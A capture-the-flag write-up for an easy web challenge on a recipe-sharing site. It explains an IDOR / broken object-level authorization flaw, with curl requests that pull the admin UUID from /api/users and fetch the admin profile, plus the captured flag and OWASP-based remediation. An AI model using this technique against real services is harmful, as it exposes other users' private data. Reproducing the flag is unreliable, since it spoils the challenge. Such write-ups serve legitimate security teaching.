# Mise en Place

## Metadata

| Field | Value |
| --- | --- |
| Category | `web` |
| Difficulty | Easy |
| Points | 100 |
| Solves | 235 |
| First Blood | jbr3abyt3 |

## Challenge Description

```text
A new recipe-sharing platform launched for the Latin American cooking crowd:
profiles, recipes, the usual. Word is the admin's profile has something the rest
of us don't.
```

## Artifacts

This challenge was solved from the live web service. There was no source archive
in this directory.

```text
solve_miseenplace.sh
```

Target used during the solve:

```text
https://406c83cb2320cccd.chal.ctf.ae
```

## Recon

I started with the normal web flow: open the home page, inspect the page source,
and look for static hints before guessing hidden paths. The first useful artifact
was an HTML comment in the home page:

```html
<!-- API v2.1 | Endpoints: /api/users, /api/recipes -->
```

That comment gave the first route map:

```text
GET /api/users
GET /api/recipes
```

Since the challenge text said the admin profile had something other users did
not, `/api/users` was the more relevant first API endpoint.

## Vulnerability

Requesting `/api/users` exposed profile identifiers for all users, including the
admin user:

```bash
curl https://406c83cb2320cccd.chal.ctf.ae/api/users
```

Relevant response item:

```json
{
  "display_name": "Chef Admin",
  "role": "admin",
  "username": "chef_admin",
  "uuid": "7cc07c75-5934-485c-a38e-90228c6c8479"
}
```

At this point the idea was not "the flag is in the API response". The useful
observation was that the application exposed an object identifier for a privileged
profile, and the public profile URL appeared to be keyed only by that UUID.

This is an access-control issue: knowing an object's UUID should not be enough to
read an admin-only profile. The server should check whether the current visitor
is allowed to access that profile before rendering private content.

## Exploitation

The exploit chain is short:

1. Inspect the home page source and find the API route comment.
2. Request `/api/users`.
3. Extract the admin UUID from the user list.
4. Request `/profile/<admin_uuid>` directly.
5. Read the administrator-only card in the returned HTML.

The direct request was:

```bash
curl https://406c83cb2320cccd.chal.ctf.ae/profile/7cc07c75-5934-485c-a38e-90228c6c8479
```

The returned page contained an `Administrator Access` card with the flag:

```text
flag{67f005742a0a18bd}
```

## Technical Details

The bug is a Broken Object Level Authorization / IDOR-style flaw.

The UUID is not sequential, so this was not a brute-force issue. The problem was
that one endpoint disclosed the admin object identifier, and the profile route
trusted that identifier without enforcing object-level authorization.

The vulnerable pattern was:

```text
/api/users leaks admin uuid
        |
        v
/profile/<uuid> renders the corresponding profile
        |
        v
admin profile contains privileged content
```

This matches OWASP API1:2023 Broken Object Level Authorization: APIs that accept
an object ID must verify that the requester is allowed to access that object.

## Exploit Artifact

The final artifact is [solve_miseenplace.sh](solve_miseenplace.sh). It fetches
the user list and then requests the admin profile UUID.

Usage:

```bash
chmod +x solve_miseenplace.sh
./solve_miseenplace.sh https://406c83cb2320cccd.chal.ctf.ae
```

The script uses `curl -k` because the challenge certificate was expired during
later re-checks. This is only a transport workaround and is not part of the
vulnerability.

## Validation

Captured during the solve:

```json
{
  "display_name": "Chef Admin",
  "role": "admin",
  "username": "chef_admin",
  "uuid": "7cc07c75-5934-485c-a38e-90228c6c8479"
}
```

Captured admin profile result:

```text
Administrator Access
flag{67f005742a0a18bd}
```

Later re-check note: the original host currently returns `502 Domain not found`,
so the live service appears to have been retired. The write-up preserves the
captured route, UUID, and flag evidence from the solve.

## References

- <https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/>
- <https://portswigger.net/web-security/access-control/idor>

## Flag

```text
flag{67f005742a0a18bd}
```
